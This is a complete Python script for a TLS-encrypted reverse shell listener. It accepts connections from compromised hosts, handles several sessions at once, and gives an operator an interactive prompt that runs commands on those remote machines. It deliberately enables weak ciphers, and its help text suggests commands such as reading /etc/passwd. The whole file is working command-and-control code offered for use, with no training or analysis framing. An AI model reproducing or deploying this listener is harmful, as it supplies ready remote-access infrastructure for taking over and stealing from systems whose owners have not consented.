#!/usr/bin/env python3

import socket
import ssl
import threading
import sys
import os
from datetime import datetime

class TLSReverseShellReceiver:
    def __init__(self, host='0.0.0.0', port=6666, cert_file='server.crt', key_file='server.key'):
        self.host = host
        self.port = port
        self.cert_file = cert_file
        self.key_file = key_file
        self.clients = []
        
    def generate_self_signed_cert(self):
        """Generate a self-signed certificate if one doesn't exist"""
        if not os.path.exists(self.cert_file) or not os.path.exists(self.key_file):
            print(f"[+] Generating self-signed certificate...")
            try:
                import subprocess
                # Generate private key
                subprocess.run([
                    'openssl', 'genrsa', '-out', self.key_file, '2048'
                ], check=True, capture_output=True)
                
                # Generate certificate
                subprocess.run([
                    'openssl', 'req', '-new', '-x509', '-key', self.key_file,
                    '-out', self.cert_file, '-days', '365', '-subj', '/CN=localhost'
                ], check=True, capture_output=True)
                
                print(f"[+] Certificate generated: {self.cert_file}")
                print(f"[+] Private key generated: {self.key_file}")
            except subprocess.CalledProcessError as e:
                print(f"[-] Failed to generate certificate: {e}")
                print("[!] Please install OpenSSL or provide existing cert/key files")
                sys.exit(1)
            except FileNotFoundError:
                print("[-] OpenSSL not found. Please install OpenSSL or provide cert/key files manually")
                sys.exit(1)

    def handle_client(self, client_socket, client_address):
        """Handle individual client connections"""
        print(f"[+] New connection from {client_address[0]}:{client_address[1]}")
        
        try:
            # Wrap socket with TLS
            context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            context.load_cert_chain(self.cert_file, self.key_file)
            # Allow weak ciphers for compatibility
            context.set_ciphers('ALL:@SECLEVEL=0')
            
            tls_socket = context.wrap_socket(client_socket, server_side=True)
            
            print(f"[+] TLS handshake completed with {client_address[0]}:{client_address[1]}")
            print(f"[+] Cipher: {tls_socket.cipher()}")
            
            # Add to client list
            client_info = {
                'socket': tls_socket,
                'address': client_address,
                'id': len(self.clients) + 1
            }
            self.clients.append(client_info)
            
            # Read initial message
            try:
                initial_data = tls_socket.recv(4096).decode('utf-8', errors='ignore')
                if initial_data:
                    print(f"[Client {client_info['id']}] {initial_data.strip()}")
            except:
                pass
            
            print(f"[+] Shell session established with client {client_info['id']}")
            print(f"[!] Type 'help' for available commands")
            
            # Start interactive session
            self.interactive_session(tls_socket, client_info['id'])
            
        except ssl.SSLError as e:
            print(f"[-] TLS error with {client_address[0]}:{client_address[1]}: {e}")
        except Exception as e:
            print(f"[-] Error handling client {client_address[0]}:{client_address[1]}: {e}")
        finally:
            try:
                tls_socket.close()
            except:
                pass
            # Remove from client list
            self.clients = [c for c in self.clients if c['socket'] != tls_socket]
            print(f"[-] Client {client_address[0]}:{client_address[1]} disconnected")

    def interactive_session(self, tls_socket, client_id):
        """Interactive shell session with the client"""
        try:
            while True:
                try:
                    # Get command from user
                    command = input(f"[Client {client_id}]$ ").strip()
                    
                    if command.lower() in ['exit', 'quit']:
                        print(f"[!] Closing connection to client {client_id}")
                        break
                    elif command.lower() == 'help':
                        self.show_help()
                        continue
                    elif command.lower() == 'clients':
                        self.list_clients()
                        continue
                    elif command.startswith('switch '):
                        try:
                            target_id = int(command.split()[1])
                            self.switch_client(target_id)
                            break
                        except (ValueError, IndexError):
                            print("[-] Usage: switch <client_id>")
                            continue
                    elif command.lower() == 'download':
                        print("[!] Download feature not implemented in this version")
                        continue
                    elif command.lower() == 'upload':
                        print("[!] Upload feature not implemented in this version")
                        continue
                    elif not command:
                        continue
                    
                    # Send command to client
                    tls_socket.send((command + '\n').encode('utf-8'))
                    
                    # Receive response
                    response = tls_socket.recv(8192)
                    if not response:
                        print(f"[-] Client {client_id} disconnected")
                        break
                    
                    # Print response
                    output = response.decode('utf-8', errors='ignore')
                    if output.strip():
                        print(output.rstrip())
                    
                except KeyboardInterrupt:
                    print(f"\n[!] Use 'exit' to close connection or 'clients' to see active connections")
                    continue
                except socket.error:
                    print(f"[-] Connection lost to client {client_id}")
                    break
                    
        except Exception as e:
            print(f"[-] Session error: {e}")

    def show_help(self):
        """Show available commands"""
        help_text = """
Available Commands:
==================
help              - Show this help message
clients           - List active client connections
switch <id>       - Switch to different client session
exit/quit         - Close current client connection
download <file>   - Download file from client (not implemented)
upload <file>     - Upload file to client (not implemented)

Shell Commands:
===============
Any other command will be executed on the remote shell.
Examples: ls, pwd, whoami, cat /etc/passwd, etc.
        """
        print(help_text)

    def list_clients(self):
        """List all active client connections"""
        if not self.clients:
            print("[!] No active client connections")
            return
        
        print("\nActive Client Connections:")
        print("=" * 40)
        for client in self.clients:
            print(f"Client {client['id']}: {client['address'][0]}:{client['address'][1]}")
        print()

    def switch_client(self, target_id):
        """Switch to a different client session"""
        target_client = None
        for client in self.clients:
            if client['id'] == target_id:
                target_client = client
                break
        
        if not target_client:
            print(f"[-] Client {target_id} not found")
            return
        
        print(f"[+] Switching to client {target_id} ({target_client['address'][0]}:{target_client['address'][1]})")
        self.interactive_session(target_client['socket'], target_id)

    def start_server(self):
        """Start the TLS reverse shell receiver"""
        # Generate certificate if needed
        self.generate_self_signed_cert()
        
        # Create socket
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            
            print(f"[+] TLS Reverse Shell Receiver")
            print(f"[+] Listening on {self.host}:{self.port}")
            print(f"[+] Certificate: {self.cert_file}")
            print(f"[+] Private Key: {self.key_file}")
            print(f"[+] Waiting for connections...")
            print(f"[+] Current time: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC")
            print("-" * 60)
            
            while True:
                try:
                    client_socket, client_address = server_socket.accept()
                    
                    # Handle each client in a separate thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, client_address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except KeyboardInterrupt:
                    print("\n[!] Shutting down server...")
                    break
                except Exception as e:
                    print(f"[-] Server error: {e}")
                    
        except Exception as e:
            print(f"[-] Failed to start server: {e}")
        finally:
            server_socket.close()

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 listener.py <port> [host] [cert_file] [key_file]")
        print("Example: python3 listener.py 6666")
        print("Example: python3 listener.py 6666 0.0.0.0 server.crt server.key")
        sys.exit(1)
    
    port = int(sys.argv[1])
    host = sys.argv[2] if len(sys.argv) > 2 else '0.0.0.0'
    cert_file = sys.argv[3] if len(sys.argv) > 3 else 'server.crt'
    key_file = sys.argv[4] if len(sys.argv) > 4 else 'server.key'
    
    receiver = TLSReverseShellReceiver(host, port, cert_file, key_file)
    receiver.start_server()

if __name__ == "__main__":
    main()
